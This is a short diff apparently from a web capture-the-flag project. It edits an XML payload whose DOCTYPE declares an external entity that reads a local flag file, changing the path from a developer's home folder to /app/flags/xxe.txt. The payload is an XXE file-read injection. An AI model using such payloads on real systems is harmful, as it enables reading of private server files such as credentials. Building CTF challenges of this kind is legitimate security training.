@@ -1,4 +1,4 @@
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/cata/licenta/web-ctf/flags/xxe.txt"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///app/flags/xxe.txt"> ]>
 <data>
     <firstname>
         John
